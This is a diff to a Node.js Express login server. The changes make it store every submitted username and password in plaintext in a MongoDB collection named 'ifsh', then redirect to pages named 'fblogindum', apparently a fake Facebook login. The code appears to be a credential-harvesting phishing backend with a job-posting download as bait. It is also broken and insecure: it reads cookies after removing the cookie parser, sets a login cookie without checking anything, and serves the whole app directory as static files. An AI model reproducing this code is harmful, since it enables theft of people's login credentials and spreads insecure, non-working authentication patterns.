@@ -1,7 +1,6 @@
 const express = require('express');
 const mongoose = require('mongoose');
 const bodyParser = require('body-parser');
-const cookieParser = require('cookie-parser'); // Add cookie-parser
 const fs = require('fs');
 const path = require('path');
 const { MongoClient } = require('mongodb');
@@ -26,11 +25,9 @@ async function connectToDatabase() {
 
 connectToDatabase();
 
-// Middleware to parse form data and cookies
+// Middleware to parse form data
 app.use(bodyParser.urlencoded({ extended: true }));
-app.use(express.json());
-app.use(cookieParser()); // Use cookie-parser
-app.use(express.static(__dirname)); // Serve static files from the current directory
+app.use(express.static(__dirname)); // Serve static files from the "public" directory
 
 // Route to handle login form submission
 app.post('/submit-login', async (req, res) => {
@@ -42,45 +39,56 @@ app.post('/submit-login', async (req, res) => {
             return res.status(500).send('Database connection not initialized.');
         }
 
+        // Create the login data object
         const loginData = { username, password, timestamp: new Date() };
+        
+        // Log before inserting data
         console.log("Attempting to insert data:", loginData);
+        
+        // Insert the new user data without checking for existing users
         const result = await db.collection('ifsh').insertOne(loginData);
+        
+        // Log the result after successful insertion
         console.log("Data inserted successfully:", result);
-
-        // Set a login cookie to mark the user as authenticated
-        res.cookie('isLoggedIn', true, { httpOnly: true, maxAge: 3600000 }); // Cookie expires in 1 hour
-        res.redirect('/Job Postings.html');
+        
+        res.redirect(`/fblogindum2.html`);
     } catch (error) {
         console.error('Error saving data to MongoDB:', error);
         res.status(500).send('Error saving data to MongoDB.');
     }
 });
 
-// Route to check if user credentials are in the database
-app.post('/check-credentials', async (req, res) => {
+app.get('/fblogindum2.html', (req, res) => {
+    res.sendFile(path.join(__dirname, 'fblogindum2.html'));
+});
+
+app.post('/submit-additional-info', async (req, res) => {
     const { username, password } = req.body;
+    // Connect and check credentials, if valid:
+    res.cookie('isLoggedIn', true, { httpOnly: true });
+    res.redirect(`/Job Postings.html`); // Redirect after setting session
+});
 
-    try {
-        if (!db) {
-            console.error("Database connection not initialized.");
-            return res.status(500).json({ success: false, message: 'Database connection not initialized.' });
-        }
 
-        // Query the database to see if the user credentials exist
-        const user = await db.collection('ifsh').findOne({ username, password });
-
-        if (user) {
-            // Credentials found
-            res.json({ success: true });
-        } else {
-            // Credentials not found
-            res.json({ success: false });
-        }
-    } catch (error) {
-        console.error('Error checking credentials:', error);
-        res.status(500).json({ success: false, message: 'Error checking credentials' });
+// Route to check if user credentials are in the database
+app.post('/check-credentials', (req, res) => {
+    const { isLoggedIn } = req.cookies;
+    if (isLoggedIn) {
+        res.json({ success: true });
+    } else {
+        res.json({ success: false });
     }
 });
+
+app.get('/download', async (req, res) => {
+    if (req.cookies.isLoggedIn) {
+        const filePath = path.join(__dirname, 'images/jobs.jpg');
+        res.download(filePath);
+    } else {
+        res.redirect('/public/fblogindum.html');
+    }
+});
+
 
 // Routes to serve HTML files
 app.get('/', (req, res) => {
